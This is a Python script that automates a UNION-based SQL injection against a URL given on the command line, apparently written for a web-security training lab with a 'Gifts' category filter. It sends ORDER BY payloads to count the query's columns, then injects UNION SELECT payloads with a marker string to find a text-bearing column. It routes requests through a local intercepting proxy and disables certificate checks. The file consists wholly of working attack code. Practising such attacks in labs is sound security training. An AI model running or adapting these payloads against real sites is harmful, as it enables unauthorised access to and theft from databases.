import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_exploit_column_number(url):
    uri = "filter?category=Gifts"
    for number in range(1,50):
        payload = "'+order+by+%s--" %number
        response = requests.get(
            url + uri + payload,
            verify=False,
            proxies=proxies)
        if "Internal Server Error" in response.text:
            return number - 1
    raise ValueError("Max number of tries exceeded, 50")

def get_exploit_sqli_string_field(url, column_number):
    uri = "filter?category=Gifts"
    for number in range(1, column_number+1):
        string = "'JgLv7K'"
        payload_list = ['null'] * column_number
        payload_list[number-1] = string
        sql_payload = (
            "' union select " + 
            ','.join(payload_list) + 
            "--")
        response = requests.get(
            url + uri + sql_payload,
            verify=False,
            proxies=proxies)
        if response.text.count(string.strip('\'')) == 2:
            return number
    raise ValueError("Could not find the string column")

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        print("[+] Figuring out number of columns...")
        column_number = get_exploit_column_number(url)
        print("[+] The number of columns is " + str(column_number) + "." )
        string_column_number = get_exploit_sqli_string_field(url, column_number)
        print("[+] The column that contains text is " + str(string_column_number) + ".")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The SQLi attack was not successful.")
        sys.exit(-1)